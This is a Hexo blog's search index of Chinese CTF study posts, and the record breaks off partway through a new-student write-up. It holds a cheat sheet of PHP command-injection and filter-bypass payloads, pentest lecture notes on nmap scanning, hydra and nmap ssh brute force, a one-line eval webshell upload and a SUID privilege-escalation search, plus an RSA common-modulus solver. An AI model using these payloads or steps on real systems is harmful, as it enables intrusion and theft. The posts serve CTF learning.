<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctj笔记转载</title>
      <link href="/2025/10/10/ctj%E7%AC%94%E8%AE%B0%E8%BD%AC%E8%BD%BD/"/>
      <url>/2025/10/10/ctj%E7%AC%94%E8%AE%B0%E8%BD%AC%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul><li>语句<ul><li>system() <ul><li>执行外部程序(命令行)并返回命令输出的第一行为字符串.  </li><li>失败返回 false,如果没有找到命令返回空字符串.</li></ul></li><li>passthru() </li><li>与 system()不同，passthru()直接把命令执行的结果输出到标准输出,而不返回.  </li><li>shell_exec() <ul><li>返回输出第一行的内容,无回显.需要反弹 shell 使用.</li></ul></li><li>exec()<ul><li>不回显,返回命令执行的结果.</li></ul></li><li>&#96;&#96;<ul><li>在 php 中,反引号”&#96;”是可以执行系统命令的.  </li><li>反引号和 shell_exec()等价</li></ul></li></ul></li><li>命令执行<ul><li>解法<ul><li>解法1：passthru<ul><li>?c&#x3D;passthru(“tac%20fla*”);</li></ul></li></ul></li><li>解法2：绕过*号<ul><li>假如*号被过滤了，我们可以通过?c&#x3D;passthru(“ls”);</li><li>先获取flag.php是目标，然后再通过？来匹配单个字母，也就是fla?????匹配flag.php</li><li>?c&#x3D;passthru(“tac%20fla?????”);</li></ul></li><li>解法3：反字节符配合echo<ul><li>?c&#x3D;echo(<code>ls</code>);</li><li>?c&#x3D;echo%20<code>tac%20fla*</code>;</li></ul></li><li>解法4：带参数输入<ul><li>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac%20flag.php”)；</li><li>1参数逃逸，不属于c，可以使用被ban内容</li><li>web31</li></ul></li><li>解法5：exec<ul><li>echo%20exec(“cat%20f\lag.p\hp”);</li></ul></li><li>解法6：system<ul><li>?c&#x3D;system(“tac%20fla*”);</li></ul></li><li>解法7：利用cp或mv命令将flag拷贝到别处<ul><li>?c&#x3D;system(“cp%20fl*g.php%20a.txt%20”);</li><li>然后浏览器访问a.txt，读取即可</li><li>eg. web30</li></ul></li><li>解法8：万能<ul><li>?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</li><li>?c&#x3D;eval(array_pop(next(get_defined_vars())));</li></ul></li><li>如果;被ban，php代码最后一行可以不用; 然后换成?&gt;就行了</li><li>如果php被ban，可以用短标签</li></ul></li><li>对小数点的限制可以使用通配符*或者占位符？来绕过</li><li>preg_match是正则匹配</li><li>&#x2F;i : 忽略大小写</li><li>过滤空格，flag：cat$IFS<code>ls</code></li><li>绕过空格过滤：<ul><li>${IFS}$9</li><li>{IFS}</li><li>$IFS</li><li>${IFS}</li><li>IFS</li><li>&lt; </li><li>&lt;&gt; </li><li>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来</li><li>%09   (tab)</li><li>X&#x3D;$‘cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）</li><li>&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</li></ul></li><li>windows 或 linux 下:<ul><li>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</li><li>command1 | command2 只执行 command2</li><li>command1 &amp; command2 先执行 command2 后执行 command1</li><li>command1 || command2 先执行 command1，如果为假，再执行 command2</li><li>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</li></ul></li></ul><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><ul><li>isset()<ul><li>函数返回一个布尔值，如果变量存在且不包含NULL值，则返回TRUE，否则返回FALSE。</li></ul></li><li>eval() <ul><li>代码执行函数,把输入的字符串当作 php 代码执行.  </li><li>可以 eval(?&gt;<?php [input]?>[text] &lt;?[p])，也就是用标签声明一段 php代码结束后再声明下一段代码开始</li><li>在函数输入的结尾需要打分号,否则会报 unexpected ending</li></ul></li><li>assert() <ul><li>断言函数 assert(),在 RCE 中可以简单的认为它等同于 eval()</li></ul></li><li>preg_match()<ul><li>如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。</li></ul></li><li>preg_replace()  <ul><li>函数执行一个正则表达式的搜索和替换</li></ul></li><li>${}<ul><li>如果出现在字符串里就会被解析,并执行其中的 php 代码</li><li>${}本是用于在字符串中嵌入变量和执行表达式的</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 转载 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>讲座笔记</title>
      <link href="/2025/10/09/%E8%AE%B2%E5%BA%A7%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/09/%E8%AE%B2%E5%BA%A7%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<ul><li>python库踩坑：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><ul><li><p>sq</p><ul><li>爆破，伪加密，社工，掩码，字典</li><li>pwn<ul><li>开保护，找漏洞，破解</li></ul></li></ul></li><li><p>hackbar</p><ul><li>SQL：提供三种数据库的sql查询语句，以及一些方便联合查询的语句</li><li>XSS：提供xss攻击语句</li><li>string.fromcharcode()：将根据UNICODE 值来输出xss语句</li><li>html charactor ： 将XSS语句转化为HTML字符实体（以&amp;开头）</li><li>alert(xss) statement : 构建一条xss测试语句，弹出一个框内容为xss，相当于alert(‘xss’);</li><li>Encryption：对所选字符进行加密，提供了MD5，SHA-1，SHA-256，ROT13等加密方式</li><li>Encoding：对所选字符进行编码解码，提供了Base64 Encode,Base64 Decode,URLencode,URLdecode, HEX encoding, HEX decoding等方式</li><li>Other： addslashes：在每个双引号前加反斜杠 stripslashes：除去所选字符中的反斜杠 strip space：除去所选字符中的空格 reverse：将所选字符倒序排列 usefull strings：提供了一些特殊的数值如圆周率PI,斐波那契数列等，其中buffer overflow 可以输入一定长度的字符造成缓存溢出攻击</li></ul></li><li><p>搭建网站</p><ul><li>service apache2 starrt</li><li>python app文件夹</li><li>java 哪里都有可能</li></ul></li><li><p>sudo vim a.php →172….&#x2F;a.php</p></li><li><p>python搭建 路由</p></li><li><p>渗透</p><ul><li>y0usef可能是用户信息</li><li>前期信息收集</li><li>漏洞点-功能点里找<ul><li>Upload extend&#x2F;base&#x2F;找到位置</li></ul></li><li>nmap探活</li><li>NAT模式-虚拟机能够在一个网段</li><li>nmap -sP </li><li>ipconfig</li><li>扫描端口service apache2 start</li><li>3306 33060 mycircle（？？？</li><li>无影（软件</li><li>nmap -p- 192…扫描端口</li><li>pin命令更快，因为window防火墙</li><li>ssh远程连接</li><li>扫版本号信息</li></ul></li><li><p>CVE 0day nday 1day<br>    - ↑</p><ul><li>wordpress hexo模板通用漏洞</li><li>apache也有</li></ul></li><li><p>nmap -p加特定端口- -sVC 192.。。</p></li><li><p>kali自带：searchhploid apache 2.4.10</p></li><li><p>sudo find &#x2F; -name “…py”→漏洞位置？？</p></li><li><p>cat 位置</p></li><li><p>Tomcat java no php?</p></li><li><p>ssh 用finalshell天狐渗透</p></li><li><p>nmap –script&#x3D;ssh-brute 192…爆破</p></li><li><p>hydra -l …txt noend字典爆破</p></li><li><p>源代码→信息查找</p></li><li><p>dirsearch -u 地址</p></li><li><p>&#x2F;.dockerfile 放网址后面可能直接得到答案</p></li><li><p>403无权访问 302 301——状态码</p></li><li><p>Forbidden→无法访问状态</p></li><li><p>Burpsuite   代理抓包ctrl+R发送到REsquest  方便查看</p></li><li><p>Burpsuite  拓展Bypass WAF绕过403</p></li><li><p>B  intruder 狙击手<strong>长度</strong>一样-失败  trylogin失败</p></li><li><p>？关键点复制发送绕过去？？？</p></li><li><p>hackbar也可以？？？</p></li><li><p>爆破 sql注入  XXE？？</p></li><li><p>fuzz字典→搜索得到字典文件</p></li><li><p>yakit插件bypass403绕过——200成功</p></li><li><p>intruder-资源池</p></li><li><p>账户admin root 字典-交叉 payload集：2加字典，1输入</p></li><li><p>CSS美化不看</p></li><li><p>上传抓包B  一句话木马 上传失败 限制 找信息变化 文件头文件类型文件长度检测</p></li><li><p>Content-Type（限制描述</p></li><li><p>GIF89a  ??放过去</p></li><li><p>一句话木马</p></li><li><p>&lt;？php @eval&gt;</p></li><li><p>标签</p></li><li><p>request(同时接受request post) post cookie</p></li><li><p>存储cookie</p></li><li><p>中国蚁剑？？（软件</p></li><li><p>右键 虚拟终端-环境变量里</p></li><li><p>yousef形容用户</p></li><li><p>1000<strong>提权</strong>？？</p></li><li><p>Finalshell ssh连接</p></li><li><p>SSTI</p></li><li><p>find &#x2F; -user root -perm -4000 print 2&gt;&#x2F;dev&#x2F;null</p></li><li><p>base64 。。。txt  strings不要用</p></li><li><p>无回显？？</p></li><li><p>awb</p></li></ul><p>电子取证</p><ul><li>计算机，服务器，手机1取证</li><li>exe,数据库，网站，区块链，物联网，流量，内存取证</li><li>conf后缀文件 信息重灾区 一种用于存储软件或系统配置信息的文件格式。</li><li>auth</li></ul><p>电子取证</p><ul><li>方向：计算机取证，服务器取证，⼿机取证<ul><li>exe取证，数据库取证，⽹站取证，区块链取证，物联⽹取证，流量取证，内存取证</li></ul></li><li>工具<ul><li>vmware workstation（虚拟机运⾏），kali linux（linux环境），010editor&#x2F;winhex（⼗六进制编辑器），vscode&#x2F;pycharm（代码）</li></ul></li><li>电脑取证：xways forensics</li><li>磁盘：ufs，ftk imager，efdd</li><li>解密：ctool，passwarekit，hashcat，cyberchef</li><li>数据库：dbbrowser，navicat</li><li>内存取证：volatility</li><li>流量取证：wireshark（pcapng），fiddler（saz）</li><li>apk取证：夜神模拟器&#x2F;雷电模拟器&#x2F;雷神模拟器，MT管理器，jadx-gui</li><li>服务器取证：xshell&#x2F;finalshell&#x2F;xterminal ssh⼯具</li><li>exe取证：沙箱，die，ida，⽕绒</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 笔记 </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扩展欧几里得算法[待]</title>
      <link href="/2025/10/06/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
      <url>/2025/10/06/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>知识递进：</p><ol><li>同余符号：a &#x3D; b % c ; b ≡ a mod c → <strong>a % c &#x3D; b % c</strong><br>rsa中应用：c &#x3D; m ^ e % n ；m ^ e ≡ c mod n</li><li>gcd(a,b)<br>基础算法：for i in range(0,min(a,b)):<br>         if a % i &#x3D;&#x3D; 0 | b % i &#x3D;&#x3D; 0:<br>             return i</li><li>欧几里得算法又称辗转相除法，是指用于计算两个正整数a，b的最大公约数。<br>[此时mod等同于%] gcd(a,b) &#x3D; gcd(b,a mod b)<br>原理：两个整数的最大公约数等于其中较小的数和两数相除余数的最大公约数。<br>算法：<br>求gcd(a,b)[假设a&gt;b]：<br>a ÷ b &#x3D; c mod d<br>b ÷ d &#x3D; e mod f<br>d ÷ f &#x3D; g mod h<br>if h &#x3D;&#x3D; 0 → f &#x3D; gcd(a,b)</li><li>证明：gcd(a,b) &#x3D; gcd(b,a mod b) (不妨设a＞b 且r&#x3D;a mod b ,r不为0)</li></ol><ul><li>法一：公约数是最大公约数的因子，得到d &#x3D; e<br><img src="/images/3-5.png"></li><li>法二(感觉网上这个有点错误，改了下)<br>假设c &#x3D; gcd(a,b),则存在m,n，使a &#x3D; mc, b &#x3D; nc;<br>令r &#x3D; a mod b，即存在k，a &#x3D; kb+r, 使r &#x3D; a-kb &#x3D; mc - knc &#x3D; (m-kn)c;<br>故gcd(b,a mod b) &#x3D; gcd(b,r) &#x3D; gcd(nc,(m-kn)c) &#x3D; gcd(n,m-kn)c;<br>则c为b与a mod b的公约数;<br>假设d &#x3D; gcd(n,m-kn), 则存在x,y, 使n &#x3D; xd, m-kn &#x3D; yd; 故m &#x3D; yd+kn &#x3D; yd+kxd &#x3D; (y+kx)d;<br>故有a &#x3D; mc &#x3D; (y+kx)dc, b &#x3D; nc &#x3D; xdc; 可得 gcd(a,b) &#x3D; gcd((y+kx)dc,xdc) &gt;&#x3D; dc;<br>由于gcd(a,b) &#x3D; c, 【故 c &gt;&#x3D; dc, d &lt;&#x3D; 1 ,又d &#x3D; gcd(n,m-kn)，所以d &gt;&#x3D; 1, 】[^1]综上：d &#x3D; 1;<br>即gcd(n,m-kn) &#x3D; 1, 故可得gcd(b,a mod b) &#x3D; c;<br>故得证gcd(a,b) &#x3D; gcd(b,a mod b).</li></ul><p><a href="https://baike.baidu.com/item/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/1647675">原解法来源</a></p><p>注释：<br>[^1]: 自己删改的部分</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPC新生讲座题目wp</title>
      <link href="/2025/10/06/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE/"/>
      <url>/2025/10/06/SPC%E6%96%B0%E7%94%9F%E8%AE%B2%E5%BA%A7%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2">曼波曼波曼波</a></li><li><a href="#ida%E4%BD%BF%E7%94%A8exe">ida使用.exe</a></li><li><a href="#twoes1">twoEs1</a></li><li><a href="#twoes2">twoEs2</a></li><li><a href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7">签个到吧！</a></li><li><a href="#xor">xor</a><ul><li><a href="#%E7%AC%AC%E4%B8%80%E6%AD%A5">第一步</a></li><li><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5">第二步</a></li><li><a href="#%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81">解密代码</a></li></ul></li><li><a href="#%E8%BF%99%E7%BE%BD%E6%AF%9B%E7%90%83%E6%80%8E%E4%B9%88%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8D%8A%E5%95%8A%E6%81%BC">这羽毛球怎么只有一半啊（恼）</a><ul><li><a href="#%E5%BE%85">【待】</a></li></ul></li><li><a href="#%E6%8E%A9%E7%A0%81%E7%88%86%E7%A0%B4">掩码爆破</a></li><li><a href="#f12">F12?</a></li><li><a href="#f12-1">F12</a></li><li><a href="#test">test</a></li><li><a href="#word-03">word-03</a></li><li><a href="#basic-number-theory">Basic Number theory</a></li><li><a href="#basic-rsa">basic-RSA</a></li><li><a href="#hackbar">hackbar</a></li><li><a href="#super_baby_eval">super_baby_eval</a></li><li><a href="#baby_upload">baby_upload</a></li><li><a href="#baby_eval">baby_eval</a></li><li><a href="#super_baby_include">super_baby_include</a></li><li><a href="#robots">robots</a></li></ul><h3 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h3><ul><li>倒转的base，翻转脚本：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取 txt 文件并翻转内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_txt_file</span>(<span class="params">input_path, output_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        </span><br><span class="line">        reversed_content = content[::-<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(reversed_content)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功！原文件: <span class="subst">&#123;input_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;反转文件: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;原内容长度: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;反转内容长度: <span class="subst">&#123;<span class="built_in">len</span>(reversed_content)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到文件 <span class="subst">&#123;input_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">r&#x27;E:\app-down\题目工作区\mbmb\smn.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">r&#x27;E:\app-down\题目工作区\reversed_smn.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">reverse_txt_file(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>AI：Base64 编码的 ZIP 文件数据，解码后就恢复成原始的 ZIP 二进制文件。</li><li>使用 CyberChef（厨子）：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><ul><li>Input (Base64字符串) </li><li>Drag “From Base64” recipe </li><li>得到二进制数据</li><li>点击右下角下载按钮保存为 .zip 文件</li></ul></li><li>双图盲水印：<ul><li><a href="https://www.shuzhiduo.com/A/kjdwEn0wJN/">方法原地址</a></li><li>注意：在文件下打开poweshell</li><li>存档-电脑此工具位置：E:\app-down\双图盲水印\BlindWaterMark-master\BlindWaterMark-master</li></ul></li></ul><h3 id="ida使用-exe"><a href="#ida使用-exe" class="headerlink" title="ida使用.exe"></a>ida使用.exe</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to Reverse Engineering!!!</span><br><span class="line">欢迎来到逆向工程！！！</span><br><span class="line"></span><br><span class="line">Press Enter to find flag1</span><br><span class="line">按 Enter 键查找 flag1</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;</span><br><span class="line">NSSCTF&#123;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next, I will teach you how to use ida.</span><br><span class="line">接下来，我将教你如何使用 IDA。</span><br><span class="line"></span><br><span class="line">The first step is to open the exe file with ida.</span><br><span class="line">第一步是用 IDA 打开 exe 文件。</span><br><span class="line"></span><br><span class="line">F5 can convert the current interface into pseudo C code</span><br><span class="line">F5 可以将当前界面转换为伪 C 代码</span><br><span class="line"></span><br><span class="line">The shortcut key shfit + F12 is to view strings. We can often find the entry point here.</span><br><span class="line">快捷键 Shift + F12 用于查看字符串。我们经常可以在这里找到入口点。</span><br><span class="line"></span><br><span class="line">You can see flag2 there</span><br><span class="line">你可以在那里看到 flag2</span><br></pre></td></tr></table></figure><ul><li>function页面找main文件，在“You can see flag2 there”处快捷键 Shift + F12 ，找到：IDA_1s_4_VeRy_Impo</li><li>双击后页面按X连接可以看到flag2<br><img src="/images/2-11.png"></li><li>Tab 键进入伪C代码页面，双击函数可进入详细界面</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The tab key can switch between the assembly and disassembly interfaces, and sometimes disassembly can interfere with our analysis.</span><br><span class="line">Tab 键可以在汇编和反汇编界面之间切换，有时候反汇编会干扰我们的分析。</span><br></pre></td></tr></table></figure><ul><li>Tab 键进入汇编页面，观察call类型以及灰色翻译部分<br><img src="/images/2-9.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In ida, shift+E can extract data in order of the size of the program</span><br><span class="line">在 IDA 中，Shift+E 可以按程序大小顺序提取数据</span><br><span class="line"></span><br><span class="line">The R key is to convert data into character form</span><br><span class="line">R 键是将数据转换为字符形式</span><br><span class="line"></span><br><span class="line">Try to find flag3</span><br><span class="line">尝试找到 flag3</span><br></pre></td></tr></table></figure><ul><li>看mov，英文猜测important所以是倒序</li><li>断店操作：Debugger-local windows debugger-运行（如果没有窗口window-reset desktop）</li><li>直接双击找shift+E R 导出为string，得到：rTant_t0ol_iN_<br><img src="/images/3-1.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The left side of ida is the function, and sometimes you can find important information from the function name.</span><br><span class="line">IDA 的左侧是函数列表，有时候你可以从函数名中找到重要信息。</span><br><span class="line"></span><br><span class="line">The patch method can achieve our goal by directly modifying the binary file</span><br><span class="line">打补丁的方法可以通过直接修改二进制文件来实现我们的目标</span><br><span class="line"></span><br><span class="line">FLAG4 NOT HRER</span><br><span class="line">FLAG4 不在这里</span><br></pre></td></tr></table></figure><ul><li>flag4(void)（？汇编文件，选取函数名称搞补丁<br><img src="/images/3-2.png" alt="函数名字"></li><li>通过任选printf()右键Assemble，改call后为函数名称，enter修改<br><img src="/images/3-3.png" alt="打补丁"></li><li>右键Patching-apply导出，运行新程序得到：rever5e_en8ine3ring}<br><img src="/images/3-4.png" alt="应用到程序"></li><li>注：在 IDA 中从流程图视图切换回连续的文本&#x2F;表格视图用空格键</li><li>最后答案：NSSCTF{IDA_1s_4_VeRy_ImporTant_t0ol_iN_rever5e_en8ine3ring}</li></ul><h3 id="twoEs1"><a href="#twoEs1" class="headerlink" title="twoEs1"></a>twoEs1</h3><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&quot;SPCCTF&#123;********&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">e2 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#导入 gmpy2 库进行大数运算 </span></span><br><span class="line"><span class="comment">#gmpy2.gcdext(a,b)计算扩展欧几里得算法 返回 (g,s,t)，其中 g=gcd(a,b)，且 s*a + t*b = g</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973</span></span><br><span class="line"><span class="string">e1 = 1550550838</span></span><br><span class="line"><span class="string">e2 = 4196113069</span></span><br><span class="line"><span class="string">c1 = 10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711</span></span><br><span class="line"><span class="string">c2 = 3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>解决方案(基于gcd &#x3D; 1以及n相同加密)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973</span></span><br><span class="line">e1 = <span class="number">1550550838</span></span><br><span class="line">e2 = <span class="number">4196113069</span></span><br><span class="line">c1 = <span class="number">10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711</span></span><br><span class="line">c2 = <span class="number">3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否互质</span></span><br><span class="line">gcd, u, v = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gcd(e1,e2) = <span class="subst">&#123;gcd&#125;</span>&quot;</span>)  <span class="comment"># 应该是 1</span></span><br><span class="line"><span class="comment"># u × e1 + v × e2 = gcd(e1, e2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gcd == <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># 计算明文</span></span><br><span class="line">    <span class="keyword">if</span> u &lt; <span class="number">0</span>:</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">        u = -u</span><br><span class="line">    <span class="keyword">if</span> v &lt; <span class="number">0</span>:</span><br><span class="line">        c2 = gmpy2.invert(c2, n) </span><br><span class="line">        v = -v</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, u, n) * <span class="built_in">pow</span>(c2, v, n)) % n</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><ul><li>共模攻击：[ pow(a, b, n) → n为模数 ]（详见RSA）<ul><li>攻击原理：<br>如果 gcd(e1, e2) &#x3D; 1，可以通过扩展欧几里得算法找到 u, v 使得：<br>u × e1 + v × e2 &#x3D; 1<br>c1^u × c2^v ≡ m^(u×e1) × m^(v×e2) ≡ m^(u×e1 + v×e2) ≡ m^1 ≡ m (mod n)</li><li>根本原因：RSA 的安全性依赖于大数分解困难性，但当使用相同模数加密相同消息时，攻击者可以利用代数关系绕过分解问题。</li></ul></li></ul><h3 id="twoEs2"><a href="#twoEs2" class="headerlink" title="twoEs2"></a>twoEs2</h3><ul><li>题目：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&quot;SPCCTF&#123;********&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">e2 = random.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991</span></span><br><span class="line"><span class="string">e1 = 3739335288</span></span><br><span class="line"><span class="string">e2 = 3124897683</span></span><br><span class="line"><span class="string">c1 = 